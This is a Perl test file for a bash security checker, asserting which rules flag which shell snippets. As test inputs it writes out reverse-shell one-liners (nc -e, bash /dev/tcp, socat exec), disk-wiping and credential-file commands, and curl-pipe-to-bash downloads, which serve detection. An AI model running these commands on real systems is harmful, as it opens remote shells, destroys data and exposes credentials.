use Test2::V0;
use Text::Treesitter::Bash::Security::Checker;

my $checker = Text::Treesitter::Bash::Security::Checker->new(
  rules => [qw(
    PathTraversal DangerousFlags SensitiveAccess EnvDangerousVars
    UnquotedExpansion MissingAbsolutePath
    DangerousExpansion ReverseShellSink DangerousFilesystem IFSManipulation
  )],
);

sub has_rule {
  my ( $source, $rule ) = @_;
  my @issues = $checker->check_source($source);
  return scalar( grep { $_->{rule} eq $rule } @issues );
}

sub severity_of {
  my ( $source, $rule ) = @_;
  my @issues = $checker->check_source($source);
  my ($i) = grep { $_->{rule} eq $rule } @issues;
  return $i ? $i->{severity} : undef;
}

# --- DangerousExpansion (CVE-2026-29783 class) -------------------------

ok( has_rule('echo "${!HOME}"',                                'DangerousExpansion'), 'DangerousExpansion: ${!var}' );
ok( has_rule('eval "${PATH@P}"',                               'DangerousExpansion'), 'DangerousExpansion: ${var@P}' );
ok( has_rule(': "${X=$(rm -rf /)}"',                           'DangerousExpansion'), 'DangerousExpansion: ${var=value}' );
ok( has_rule('x=${$(id)}',                                     'DangerousExpansion'), 'DangerousExpansion: ${$(...)}' );
is( severity_of('echo "${!HOME}"', 'DangerousExpansion'), 'high', 'indirect expansion is high' );
ok(!has_rule('echo "$HOME/.ssh/id_rsa"', 'DangerousExpansion'), 'quoted normal var does NOT trigger' );

# --- ReverseShellSink --------------------------------------------------

ok( has_rule('nc -e /bin/sh 10.0.0.1 4444',                          'ReverseShellSink'), 'nc -e' );
ok( has_rule('ncat -e /bin/sh 10.0.0.1 4444',                         'ReverseShellSink'), 'ncat -e' );
ok( has_rule(q{socat exec:'bash -li',pty tcp:10.0.0.1:4444},         'ReverseShellSink'), 'socat exec:' );
ok( has_rule('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',                'ReverseShellSink'), 'bash -i with /dev/tcp' );
ok( has_rule(q{ssh -o ProxyCommand="nc %h %p" user@host},            'ReverseShellSink'), 'ssh ProxyCommand' );
ok( has_rule('mkfifo /tmp/x; cat /tmp/x | /bin/sh -i 2>&1 | nc ...',  'ReverseShellSink'), 'mkfifo in pipeline' );
is( severity_of('nc -e /bin/sh 10.0.0.1 4444', 'ReverseShellSink'), 'high', 'nc -e is high' );
ok(!has_rule('echo "no reverse shell here"', 'ReverseShellSink'), 'plain echo does NOT trigger ReverseShellSink' );

# --- DangerousFilesystem ----------------------------------------------

ok( has_rule('dd if=/dev/zero of=/dev/sda',       'DangerousFilesystem'), 'dd of=/dev/sda' );
ok( has_rule('dd if=/dev/zero of=/dev/nvme0n1',   'DangerousFilesystem'), 'dd of=/dev/nvme0n1' );
ok( has_rule('mkfs.ext4 /dev/sdb1',               'DangerousFilesystem'), 'mkfs.ext4' );
ok( has_rule('mkfs /dev/sdc1',                    'DangerousFilesystem'), 'mkfs generic' );
ok( has_rule('fdisk /dev/sda',                    'DangerousFilesystem'), 'fdisk' );
ok( has_rule('parted /dev/sda mklabel gpt',       'DangerousFilesystem'), 'parted' );
ok( has_rule(': > /etc/passwd',                   'DangerousFilesystem'), ': > /etc/passwd' );
ok( has_rule('truncate -s 0 /etc/shadow',         'DangerousFilesystem'), 'truncate of /etc path' );
ok( has_rule('shred -u ~/.bash_history',          'DangerousFilesystem'), 'shred' );
ok( has_rule('mount -o bind /tmp /var/www',       'DangerousFilesystem'), 'mount' );
ok( has_rule('umount /mnt/data',                  'DangerousFilesystem'), 'umount' );
is( severity_of('dd if=/dev/zero of=/dev/sda', 'DangerousFilesystem'), 'high', 'dd to device is high' );
ok(!has_rule('df -h /tmp', 'DangerousFilesystem'), 'df does NOT trigger DangerousFilesystem' );

# --- IFSManipulation --------------------------------------------------

ok( has_rule(q{IFS=$' \t\n' read -r line < file},  'IFSManipulation'), 'IFS assignment' );
ok( has_rule('export IFS=,',                       'IFSManipulation'), 'export IFS' );
ok( has_rule('IFS=, read -d, -ra parts',           'IFSManipulation'), 'IFS assignment no value' );
is( severity_of(q{IFS=$' \t\n' read -r line}, 'IFSManipulation'), 'high', 'IFS assignment is high' );
ok(!has_rule('echo $IFS', 'IFSManipulation'), 'bare $IFS without assignment is at most medium' );

# --- SensitiveAccess: extended credential paths ----------------------

ok( has_rule('cat ~/.docker/config.json',          'SensitiveAccess'), 'docker config' );
ok( has_rule('cat ~/.gnupg/private-keys-v1.d/foo.key', 'SensitiveAccess'), 'gnupg private keys' );
ok( has_rule('cat ~/.git-credentials',             'SensitiveAccess'), 'git-credentials' );
ok( has_rule('cat ~/.netrc',                       'SensitiveAccess'), 'netrc' );
ok( has_rule('cat ~/.pypirc',                      'SensitiveAccess'), 'pypirc' );
ok( has_rule('cat ~/.npmrc',                       'SensitiveAccess'), 'npmrc' );
ok( has_rule('cat ~/.cargo/credentials',           'SensitiveAccess'), 'cargo credentials' );
ok( has_rule('cat ~/.config/gcloud/properties',    'SensitiveAccess'), 'gcloud config' );
ok( has_rule('cat ~/.azure/azureProfile.json',     'SensitiveAccess'), 'azure profile' );
ok( has_rule('cat ~/.config/gh/hosts.yml',         'SensitiveAccess'), 'gh config' );
ok( has_rule('cat /proc/1234/environ',             'SensitiveAccess'), 'proc environ' );

# --- Background operator `&` is in walker ----------------------------

my $bash = eval { require Text::Treesitter::Bash; Text::Treesitter::Bash->new };
SKIP: {
  skip 'Text::Treesitter not installed', 1 unless $bash;
  my @cmds = $bash->commands('sleep 5 &');
  is( $cmds[0]{after_op}, undef, '& is not exported as after_op for the producer' );
}

# --- InsecureDownload (curl/wget TLS / plaintext) ---------------------

my $dl_checker = Text::Treesitter::Bash::Security::Checker->new(
  rules => [qw(InsecureDownload)],
);

sub has_dl {
  my ( $source ) = @_;
  my @issues = $dl_checker->check_source($source);
  return scalar( grep { $_->{rule} eq 'InsecureDownload' } @issues );
}

sub dl_severity {
  my ( $source ) = @_;
  my @issues = $dl_checker->check_source($source);
  my ($i) = grep { $_->{rule} eq 'InsecureDownload' } @issues;
  return $i ? $i->{severity} : undef;
}

ok( has_dl('curl -k https://x.example/install.sh'),                 'curl -k' );
ok( has_dl('curl --insecure -O https://x.example/file'),           'curl --insecure' );
ok( has_dl('wget --no-check-certificate https://x.example'),       'wget --no-check-certificate' );
ok( has_dl('wget --no-cert-check https://x.example'),              'wget --no-cert-check' );
ok( has_dl('curl --insecure=https://x.example https://x.example'), 'curl --insecure=URL' );
ok( has_dl('/usr/bin/curl -k https://x.example'),                  'absolute-path curl with -k' );
is( dl_severity('curl -k https://x.example/install.sh'), 'high',
    'curl -k is high' );
is( dl_severity('curl --insecure https://x.example'), 'high',
    'curl --insecure is high' );

ok( has_dl('curl http://x.example/script.sh | bash'),              'plaintext HTTP via curl' );
ok( has_dl('wget http://x.example/iso'),                           'plaintext HTTP via wget' );
ok( has_dl('fetch http://x.example/data'),                         'plaintext HTTP via fetch' );
is( dl_severity('curl http://x.example/script.sh | bash'), 'medium',
    'plaintext HTTP is medium' );

# Negative cases — must NOT trigger InsecureDownload.
ok(!has_dl('curl https://x.example/install.sh'),                   'https URL does NOT trigger' );
ok(!has_dl('wget --secure-protocol=auto https://x.example'),       'wget with unrelated flag does NOT trigger' );
ok(!has_dl("curl -H 'X-Foo: http://example' https://x.example"),  'http in header value does NOT trigger' );
ok(!has_dl('ls /tmp'),                                            'unrelated command does NOT trigger' );
ok(!has_dl('git pull https://x.example/repo.git'),                 'non-fetcher command does NOT trigger' );

# --- NetworkListener --------------------------------------------------

my $nl_checker = Text::Treesitter::Bash::Security::Checker->new(
  rules => [qw(NetworkListener)],
);

sub has_nl {
  my ( $source ) = @_;
  my @issues = $nl_checker->check_source($source);
  return scalar( grep { $_->{rule} eq 'NetworkListener' } @issues );
}

sub nl_severity {
  my ( $source ) = @_;
  my @issues = $nl_checker->check_source($source);
  my ($i) = grep { $_->{rule} eq 'NetworkListener' } @issues;
  return $i ? $i->{severity} : undef;
}

ok( has_nl('nc -l 4444'),                                            'nc -l' );
ok( has_nl('nc -lk 4444'),                                           'nc -lk combined flag' );
ok( has_nl('ncat -l 4444'),                                          'ncat -l' );
ok( has_nl('nc --listen 4444'),                                      'nc --listen' );
ok( has_nl('socat TCP-LISTEN:4444,fork EXEC:/bin/sh'),              'socat TCP-LISTEN' );
ok( has_nl('socat TCP4-LISTEN:80,reuseaddr EXEC:cat'),              'socat TCP4-LISTEN' );
ok( has_nl('ssh -R 8080:internal:80 bastion'),                       'ssh -R reverse tunnel' );
ok( has_nl('ssh -D 1080 bastion'),                                   'ssh -D SOCKS proxy' );
is( nl_severity('nc -l 4444'),           'high', 'nc listener is high' );
is( nl_severity('socat TCP-LISTEN:80'), 'high', 'socat listener is high' );
is( nl_severity('ssh -R 8080:b:80'),    'high', 'ssh tunnel is high' );

ok( has_nl('python -m http.server'),                                 'python -m http.server' );
ok( has_nl('python3 -m http.server 8000'),                           'python3 -m http.server' );
ok( has_nl('python2 -m SimpleHTTPServer'),                           'python2 SimpleHTTPServer' );
ok( has_nl('ruby -run -e httpd . -p 8000'),                          'ruby -run -e httpd' );
ok( has_nl('npx http-server -p 8000'),                               'npx http-server' );
is( nl_severity('python3 -m http.server'),  'medium', 'python server is medium' );
is( nl_severity('ruby -run -e httpd .'),   'medium', 'ruby server is medium' );

ok( has_nl('php -S 0.0.0.0:8000'),                                   'php -S bound to all' );
is( nl_severity('php -S 0.0.0.0:8000'), 'high', 'php 0.0.0.0 is high' );

ok( has_nl('php -S 127.0.0.1:8000'),                                 'php -S bound to localhost' );
is( nl_severity('php -S 127.0.0.1:8000'), 'low', 'php localhost is low' );

# Negative cases.
ok(!has_nl('nc host 80 < file'),                                     'nc outbound does NOT trigger' );
ok(!has_nl('nc -z host 80'),                                         'nc -z port scan does NOT trigger' );
ok(!has_nl('ssh user@host'),                                         'plain ssh does NOT trigger' );
ok(!has_nl('ssh -p 2222 user@host'),                                 'ssh -p does NOT trigger' );
ok(!has_nl('php --version'),                                         'php --version does NOT trigger' );
ok(!has_nl('echo hello'),                                            'echo does NOT trigger' );

done_testing;
